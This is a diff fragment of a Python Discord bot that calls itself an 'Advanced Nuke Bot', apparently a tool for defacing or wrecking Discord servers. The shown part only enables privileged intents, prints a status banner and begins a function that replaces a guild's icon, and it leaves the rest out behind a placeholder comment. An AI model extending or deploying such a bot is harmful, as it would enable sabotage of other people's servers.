@@ -2,11 +2,15 @@ import discord
 from discord.ext import commands
 import asyncio
 import random
-import string
 import logging
 import os
 
 intents = discord.Intents.all()
+# Fallback if intents not enabled
+intents.members = True
+intents.message_content = True
+intents.presences = True
+
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')
@@ -22,6 +26,7 @@ async def on_ready():
     print(f"[{bot.user}] Advanced Nuke Bot Online - Protocol Zero Active")
     await bot.change_presence(activity=discord.Game(name="Kieran Nuke Protocol"))
 
+# Rest of the code remains the same as before...
 async def set_kieran_icon(guild):
     try:
         with open("kieran_icon.jpg", "rb") as f:
